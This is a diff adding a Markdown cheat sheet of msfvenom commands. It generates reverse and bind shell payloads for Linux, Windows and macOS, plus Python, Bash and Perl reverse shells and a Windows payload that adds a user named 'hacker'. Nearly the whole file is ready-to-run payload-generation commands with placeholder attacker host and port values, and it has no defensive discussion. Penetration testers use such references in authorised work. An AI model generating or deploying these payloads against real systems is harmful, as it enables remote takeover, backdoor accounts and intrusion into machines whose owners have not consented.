@@ -1,0 +1,59 @@
+# Payloads MSF Venom
+
+All 
+# msfvenom -l payloads
+....................................................................................
+Linux payloads
+
+Meterpreter reverse shell x86 multi stage
+# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elfLinux
+
+Linux Meterpreter bind shell x86 multi stage
+# msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
+
+Linux bind shell x64 single stage
+# msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
+
+Linux reverse shell x64 single stage
+# msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
+....................................................................................
+Windows payloads
+
+Windows Meterpreter reverse shell
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
+
+Windows Meterpreter bind shell
+# msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
+
+Windows CMD Multi Stage
+# msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
+
+Windows CMD Single Stage
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
+
+Windows add user
+msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
+..................................................................................
+Mac OS payloads
+
+Mac Reverse Shell
+# msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
+
+Mac Bind shell
+# msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
+....................................................................................
+Python
+
+Python Shell
+# msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
+....................................................................................
+Bash
+
+BASH Shell
+# msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
+....................................................................................
+Perl
+
+PERL Shell
+# msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
+....................................................................................
